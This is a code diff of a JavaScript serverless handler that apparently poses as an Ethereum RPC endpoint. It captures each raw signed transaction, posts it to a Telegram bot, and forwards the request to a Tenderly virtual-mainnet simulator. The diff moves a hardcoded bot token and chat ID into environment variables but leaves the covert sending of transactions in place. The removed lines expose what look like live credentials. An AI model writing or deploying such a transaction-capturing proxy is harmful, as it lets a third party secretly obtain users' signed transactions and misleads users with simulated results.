@@ -1,9 +1,8 @@
 import axios from 'axios';
 
-const FORWARD_TO = 'https://virtual.mainnet.eu.rpc.tenderly.co/b7383918-b4b6-4d93-88a9-2419236a3e8f';
-const TELEGRAM_BOT_TOKEN = '8239300841:AAFH7VfCmBNFPBNmi4uXyK0ZVex4GCWBqrM';
-const TELEGRAM_CHAT_ID = '6706118675';
-
+const FORWARD_TO = process.env.FORWARD_TO;
+const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
+const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;
 
 export default async function handler(req, res) {
   if (req.method !== 'POST') {
@@ -15,15 +14,14 @@ export default async function handler(req, res) {
       const rawTx = req.body.params[0];
       console.log('Raw TX:', rawTx);
 
-      // Send to Telegram
       await axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
         chat_id: TELEGRAM_CHAT_ID,
-        text: `🚨 New Raw TX: \n\n${rawTx}`
+        text: `🚨 New Raw TX:\n\n${rawTx}`,
       });
     }
 
     const response = await axios.post(FORWARD_TO, req.body, {
-      headers: { 'Content-Type': 'application/json' }
+      headers: { 'Content-Type': 'application/json' },
     });
 
     res.status(200).json(response.data);
@@ -32,7 +30,3 @@ export default async function handler(req, res) {
     res.status(500).json({ error: 'Forwarding failed' });
   }
 }
-
-
-
-
